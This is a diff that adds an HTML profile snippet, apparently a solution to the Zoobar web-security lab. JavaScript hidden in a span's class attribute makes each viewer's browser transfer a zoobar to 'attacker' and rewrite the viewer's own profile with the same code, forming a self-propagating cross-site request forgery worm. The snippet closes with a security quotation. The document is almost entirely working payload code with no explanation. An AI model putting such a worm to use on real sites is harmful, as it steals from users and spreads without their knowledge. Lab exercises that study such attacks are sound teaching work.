@@ -1,0 +1,20 @@
+<span id='zoobars' class="var request = new XMLHttpRequest();
+request.open('post','http://zoobar.org/transfer.php',true);
+request.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+var amp = String.fromCharCode(38);
+request.send(String.concat('zoobars=1',amp,'recipient=attacker',amp,'submission=Send'));
+request.open('post','http://zoobar.org/index.php',true);
+request.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+var profile=document.getElementById('profile');
+request.send(String.concat('profile_update=',profile.innerHTML,amp,'profile_submit=Save'));
+var main = document.getElementById('main');
+main.style.backgroundImage = 'url(http://i.imgur.com/OwVUd.png)';
+main.style.width = '527px';
+main.style.height = '265px';
+main.style.border = 'none';">
+<span style="color:white;background-color:black;">
+"The only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room with armed guards."
+</span>
+</br>
+-Gene Spafford
+</span>
